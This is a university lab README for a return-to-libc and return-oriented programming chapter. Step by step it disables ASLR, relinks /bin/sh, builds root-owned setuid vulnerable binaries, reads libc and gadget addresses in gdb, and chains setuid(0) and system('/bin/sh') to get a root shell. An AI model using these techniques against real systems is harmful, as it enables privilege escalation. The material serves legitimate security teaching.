# The Return-to-libc Attack & Return-Oriented Programming

This directory contains source code and notes for the return-to-libc attack & return-oriented programming chapter.

### Required Files for the Return-to-libc Attack Lab:

These are the files that you absolutely need to complete the lab related to this chapter.

- `retlib.c` : The vulnerable program for the return-to-libc attack lab.
- `libc_exploit.py`: Create malicious `badfile`  (to attack the `retlib.c` program)

### Overview of other files in this repo::

**Small Examples**
- `shellcode.c`: A condensed version of the shellcode program _(we saw this previously)_
- `envaddr.c`: Show address of user-added environment variable
- `func_prologue_epilogue.c`: a small program for looking at function prologues/epilogues

**Return-to-libc Attack Example**

_These files are similar to the files used in the lab, **but they are different**._
_These files are primarily used for in-class demos._

- `stack.c` : The vulnerable program _(used in return-to-libc attack example)_
- `libc_exploit_stack.py`: Create malicious `badfile` (to attack the `stack.c` program)

**ROP Example**
- `stack_rop.c` : Another vulnerable program _(similar to `stack.c` with minor changes for a ROP example)_
- `chain_noarg.py` : (Example 1) Build payload that causes the vuln. program to execute a function (`bar`) multiple times _(bar takes NO ARGUMENTS)_
- `chain_witharg.py` : (Example 2) Build payload that causes the vuln. program to execute a function (`baz`) multiple times _(baz takes ONE ARGUMENT)_
- `chain_printf.py` : (Example 3) Build payload that can chain libc function calls
- `chain_attack.py` : (Example 4) Final example that builds payload to call `setuid(0)` followed by `system("/bin/sh")`.

## Non-Executable Stack (`shellcode.c`)

**Executable stack:**
```bash
gcc -o shellcode -z execstack shellcode.c
./shellcode
```
**Non-executable stack:**
```bash
gcc -o shellcode -z noexecstack shellcode.c
./shellcode
```

# Return-to-libc Attack Demo (target=`stack.c`)

**Setup**
```bash
# DISABLE ASLR!
sudo sysctl -w kernel.randomize_va_space=0
# LINK TO SHELL THAT DOESN'T DROP PRIVILEGES FOR SETUID PROGRAMS
sudo ln -sf /bin/zsh /bin/sh
# ENABLE NON-EXECUTABLE STACK
gcc -fno-stack-protector -z noexecstack -o stack stack.c
# ROOT-OWNED SETUID PROGRAM
sudo chown root stack
sudo chmod 4755 stack
```

**Task A: Find address of system()**

```bash
gdb -q stack  # -q starts gdb in quiet mode
#Reading symbols from stack...(no debugging symbols found)…done.
gdb-peda$ b main  # run the program to get libc loaded into memory
gdb-peda$ run  # run the program to get libc loaded into memory
gdb-peda$ p system
gdb-peda$ p exit
gdb-peda$ quit
```

**Task B: Find the address of the “/bin/sh” string**

```bash
export MYSHELL="/bin/sh"
gcc -o myenv envaddr.c # truncate program name to 5 letters, like "stack"
$ ./myenv
  Value:   /bin/sh
  Address: bffffef8
```

**Task C: Construct arguments for system()**

Update addresses in `libc_exploit.py` based on Tasks A and B,
and what we know about about function prologues and epilogues.
_(i.e., we need to know where on the stack we should put the argument to `system`,
  so that when we return to `system`, it will run our desired command.)_

When you think you've got the addresses/offset correct, run:

```bash
chmod +x libc_exploit.py # only need to run this if this file isn't already executable.
libc_exploit.py
./stack
```







# Return-Oriented Programming

```bash
sudo sysctl -w kernel.randomize_va_space=0
sudo ln -sf /bin/zsh /bin/sh
export MYSHELL="/bin/sh"
rm -f badfile && touch badfile
```
```bash
gcc -fno-stack-protector -z noexecstack -o stack_rop stack_rop.c
sudo chown root stack_rop
sudo chmod 4755 stack_rop
stack_rop
# The '/bin/sh' string's address: 0xbffffef0
# Address of buffer[]:  0xbfffead8
# Frame Pointer value:  0xbfffeb48
# Diff between buffer & frame pointer = 112
# Returned Properly
```

**NOTE: Be sure to use the ebp (frame pointer) value that is printed out by running `./stack_rop` directly.**
**If you use a value for ebp that you obtain from gdb, it will not be correct!**


## Example 1 --- Returning to Function (WITHOUT Args)

> _**Observation 5.1:**_
> _Assume a function A()'s return address field contains the address of the entry point of function B(),_
> _and the frame pointer of function A() points to address X. After the program returns to function B() from function A(),_
> _the frame pointer will point to address X+4._

```bash
$ gdb -q stack_rop
Reading symbols from stack_rop...(no debugging symbols found)...done.
gdb-peda$ b foo
gdb-peda$ r
gdb-peda$ p bar
$1 = {<text variable, no debug info>} 0x8048582 <bar>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xb7e369d0 <__GI_exit>
gdb-peda$ q
```
Update `chain_noarg.py` with the above addresses, then run:  
```bash
chain_noarg.py && stack_rop
# Address of buffer[]:  0xbfffead8
# Frame Pointer value:  0xbfffeb48
# Diff between buffer & frame pointer = 112
# The function bar() is invoked 1 times!
# The function bar() is invoked 2 times!
# The function bar() is invoked 3 times!
# The function bar() is invoked 4 times!
# The function bar() is invoked 5 times!
# The function bar() is invoked 6 times!
# The function bar() is invoked 7 times!
# The function bar() is invoked 8 times!
# The function bar() is invoked 9 times!
# The function bar() is invoked 10 times!
```



## Example 2 --- Returning to Function (WITH Args)

> _**Observation 5.2:**_
> _Assume a function A()'s return address field contains the address of the code that is right after B()'s function prologue;_  
> _also assume the frame pointer of function A() points to address X._
> _After the program returns to function B() from function A(), the frame pointer will point to address Y,_
> _where Y is the value stored at address X._

**key takeaway 1:**
We control the value "Y", so use that to make space on the stack for arguments.
In the textbook experiments, they let Y-X = 0x20 = 32.
NOTE: values should still not contain any 0 bytes, which would cause strcpy prematurely stop copying the payload.

**key takeaway 2:**
The function prologue (two instructions) takes up 3 bytes.
When calculating the address within a function JUST AFTER the function prologue, we simply need to add 3 to the function's address.

```bash
$ gdb -q stack_rop
Reading symbols from stack_rop...(no debugging symbols found)...done.
gdb-peda$ b foo
gdb-peda$ r
gdb-peda$ p baz
$1 = {<text variable, no debug info>} 0x80485ae <baz>
gdb-peda$ disas baz
Dump of assembler code for function baz:
   0x080485ae <+0>:	push   %ebp
   0x080485af <+1>:	mov    %esp,%ebp
   0x080485b1 <+3>:	sub    $0x8,%esp
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xb7e369d0 <__GI_exit>
gdb-peda$ q
```
Update `chain_witharg.py` with the above addresses, then run:  
```bash
chain_witharg.py && stack_rop
# Address of buffer[]:  0xbfffead8
# Frame Pointer value:  0xbfffeb48
# Diff between buffer & frame pointer = 112
# The value of baz()'s argument: 0xAABBCCDD
# The value of baz()'s argument: 0xAABBCCDD
# The value of baz()'s argument: 0xAABBCCDD
# The value of baz()'s argument: 0xAABBCCDD
# The value of baz()'s argument: 0xAABBCCDD
# The value of baz()'s argument: 0xAABBCCDD
# The value of baz()'s argument: 0xAABBCCDD
# The value of baz()'s argument: 0xAABBCCDD
# The value of baz()'s argument: 0xAABBCCDD
# The value of baz()'s argument: 0xAABBCCDD
```



## Example 3 --- Chaining DLL Function Calls (e.g., `printf`)

**key takeaway 1:**
Because of how the addresses for library functions are resolved (re: Procedure Linkage Table - PLT),
we cannot simply jump into `system` (or other library calls) at the address JUST AFTER the function prologue.
(Use gdb to confirm this...)

```bash
gdb
b main
r
disas baz
disas printf
```
**key takeaway 2:**
Instead, we can jump to an "empty function" (actually `empty+3`, skipping `empty()`'s prologue) between calls to
 emulate the affect of jumping over a function prologue.
There is no actual "empty function", but what we can do is jump to an instance of a `leave-ret`
(a `leave` instruction followed by a `ret` instruction.)

```bash
$ gdb -q stack_rop
Reading symbols from stack_rop...(no debugging symbols found)...done.
gdb-peda$ b foo
gdb-peda$ r
gdb-peda$ p printf
$1 = {<text variable, no debug info>} 0xb7e51670 <__printf>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xb7e369d0 <__GI_exit>
gdb-peda$ disas foo
Dump of assembler code for function foo:
    0x0804851b <+0>:	push   %ebp
    0x0804851c <+1>:	mov    %esp,%ebp
    0x0804851e <+3>:	sub    $0x78,%esp
 => 0x08048521 <+6>:	mov    %ebp,%eax
    ...
    0x08048580 <+101>:	leave
    0x08048581 <+102>:	ret
```
Update `chain_printf.py` with the above addresses, then run:  
```bash
chain_printf.py && stack_rop
# The '/bin/sh' string's address: 0xbffffef0
# Address of buffer[]:  0xbfffeab8
# Frame Pointer value:  0xbfffeb28
# Diff between buffer & frame pointer = 112
# /bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh
```



## Example 4 --- The Final Attack

Now we can chain arbitrary number of functions, with an arbitrary number of arguments.
We can return to the task of chaining these functions:
`foo() --> setuid(0) --> system("/bin/sh")`

We have to overcome the issue with putting a 0 (zero) on the stack (i.e., there are restrictions on what we can actually put in memory...).
The **KEY IDEA** is to put a non-zero value in memory first,
but cause instructions to be executed that change that value to zero AFTER the `strcpy` (for example) function copies our payload into memory.

**Question:** What kind of function allows us to change arbitrary memory values?
- `sprintf(A,B)` -- Copies B into A. Set B to null byte (zero). Set A to address that needs to be zero.

**DEMO:**

```bash
sudo sysctl -w kernel.randomize_va_space=0 # DISABLE ASLR!
sudo ln -sf /bin/dash /bin/sh # Restore shell-based countermeasure
```
```bash
# Run ./stack_rop to get env address & offset
stack_rop
0xbffffef0
112

# Get address of leave-ret
gdb-peda$ disas foo
Dump of assembler code for function foo:
    0x0804851b <+0>: push   %ebp
    ...
    0x08048580 <+101>:   leave
    0x08048581 <+102>:   ret

# Get addresses of library functions
gdb-peda$ p sprintf
$1 = {<text variable, no debug info>} 0xb7e516d0 <__sprintf>
gdb-peda$ p setuid
$2 = {<text variable, no debug info>} 0xb7eb9170 <__setuid>
gdb-peda$ p system
$3 = {<text variable, no debug info>} 0xb7e42da0 <__libc_system>
gdb-peda$ p exit
$4 = {<text variable, no debug info>} 0xb7e369d0 <__GI_exit>
```
```bash
chain_attack.py && stack_rop
# The '/bin/sh' string's address: 0xbffffef0
# Address of buffer[]:  0xbfffeab8
# Frame Pointer value:  0xbfffeb28
# Diff between buffer & frame pointer = 112
```
```
# id
# uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```






# GDB Stack Frame Walkthrough (Example Illustrated in OmniGraffle)

**GDB Exploration Setup:**
```bash
# DISABLE ASLR!
sudo sysctl -w kernel.randomize_va_space=0
# LINK TO SHELL THAT DOESN'T DROP PRIVILEGES FOR SETUID PROGRAMS
sudo ln -sf /bin/zsh /bin/sh
# MAKE SURE WE DO NOT HAVE A BADFILE THAT OVERFLOWS OUR STACK JUST YET...
rm badfile
touch badfile
# DEBUGGABLE, ROOT-OWNED, SETUID PROGRAM
gcc -o stack_gdb stack.c -g -fno-stack-protector -z noexecstack
sudo chown root stack_gdb
sudo chmod 4755 stack_gdb
```

**GDB Exploration:**
```bash
### DEBUGGING STACK_GDB ###
$ gdb -q stack_gdb
gdb-peda$ b main
gdb-peda$ b foo
gdb-peda$ run

Breakpoint 1, main (argc=0x1, argv=0xbffff374) at stack.c:21
21	    badfile = fopen("badfile", "r");
gdb-peda$ disas main
gdb-peda$ print $ebp
$1 = (void *) 0xbffff2c8

gdb-peda$ continue

Breakpoint 2, foo (str=0xbffff12c "x\361\377\277\001") at stack.c:11
11	    strcpy(buffer, str);
gdb-peda$ disas foo
gdb-peda$ p $ebp
$2 = (void *) 0xbffff108

gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e42da0 <__libc_system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xb7e369d0 <__GI_exit>

gdb-peda$ quit
```

**Other stuff...**
```bash
gdb-peda$ backtrace
gdb-peda$ info frame 0
gdb-peda$ info frame 1

layout asm
layout regs
#ctrl-x-a to exit
```
